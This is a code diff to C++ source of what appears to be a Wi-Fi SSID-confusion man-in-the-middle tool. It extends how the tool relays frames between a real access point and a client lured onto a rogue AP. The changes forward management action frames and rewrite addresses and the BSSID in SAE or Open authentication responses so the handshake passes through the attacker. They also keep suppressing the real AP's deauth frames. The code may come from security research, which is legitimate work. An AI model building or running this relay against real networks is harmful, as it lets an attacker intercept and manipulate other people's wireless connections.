@@ -101,10 +101,10 @@ FrameProcess SsidConfusion::handle_probe_real(const HWAddress<6> addr2, const Do
 	return CONTINUE;
 }
 
-FrameProcess SsidConfusion::handle_sa_query_real(const HWAddress<6> addr1, const Dot11 &dot11, const frame_raw_t &raw) const {
-	// SA Query Request from real AP -> relay to STA on rogue (transparent, MIC stays valid)
-	if(dot11.type() == Dot11::MANAGEMENT && dot11.subtype() == 13 && addr1 == rogue_sta.get(SK::mac)) {
-		display_traffic(dot11, "Real channel", " SA Query req -- relay to rogue");
+FrameProcess SsidConfusion::handle_mgmt_action_real(const HWAddress<6> addr1, const Dot11 &dot11, const frame_raw_t &raw) const {
+	//Don't know what exactly - for example SA Query Request from real AP -> relay to STA on rogue (transparent, MIC stays valid)
+	if(dot11.type() == dot11::TYPE_MGMT && dot11.subtype() == dot11::MGMT_ACTION && addr1 == rogue_sta.get(SK::mac)) {
+		display_traffic(dot11, "Real channel", " MGMT_ACTION -- relay to rogue");
 		send_to_rogue(raw);
 		return STOP;
 	}
@@ -151,10 +151,22 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 		log(LogLevel::DEBUG, "Real channel: Unknown frame type");
 		return;
 	}
+	power_mgmt_response_real(addr2, *dot11);
+
 	// ignore useless
+	if(dot11->type() == dot11::TYPE_CTRL && dot11->subtype()) return;
 	if(dot11->find_pdu<Dot11Beacon>()) return; // don't relay real AP beacons
 	if(dot11->find_pdu<Dot11Authentication>()) {
-		display_traffic(*dot11, "Real channel", "-- Ignore");
+		if(addr1 == rogue_sta.get(SK::mac)) {
+			// relay AP auth response back to client (SAE commit/confirm, or Open seq=2)
+			auto relayed = ensure_radiotap(raw);
+			const size_t rt_len = radiotap::get_rt_len(relayed);
+			if(relayed.size() >= rt_len + dot11::ADDR1_END)
+				ranges::copy(HWAddress<6>(sta.get(SK::mac)), relayed.begin() + static_cast<ptrdiff_t>(rt_len + dot11::ADDR1_OFFSET));
+			rewrite_bssid_in_frame(relayed, rogue_ap.get(SK::mac));
+			send_to_rogue(relayed);
+			display_traffic(*dot11, "Real channel", "-- Auth relay to client");
+		}
 		return;
 	}
 	// don't relay deauth/disassoc from real AP - would disconnect client from rogue AP
@@ -164,16 +176,12 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 		return;
 	}
 
-
-	power_mgmt_response_real(addr2, *dot11);
-
-
 	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;
 
 	SOLVE_OR_CONTINUE(handle_probe_real(addr2, *dot11))
 	SOLVE_OR_CONTINUE(handle_eapol_real(addr2, *pdu, raw))
 	SOLVE_OR_CONTINUE(handle_assoc_real(addr1, *pdu, raw))
-	SOLVE_OR_CONTINUE(handle_sa_query_real(addr1, *dot11, raw))
+	SOLVE_OR_CONTINUE(handle_mgmt_action_real(addr1, *dot11, raw))
 	#undef SOLVE_OR_CONTINUE
 
 	if((addr1 == rogue_sta.get(SK::mac) || addr2 == ap.get(SK::mac)) && client_state.get_state() >= ClientState::Associated) {
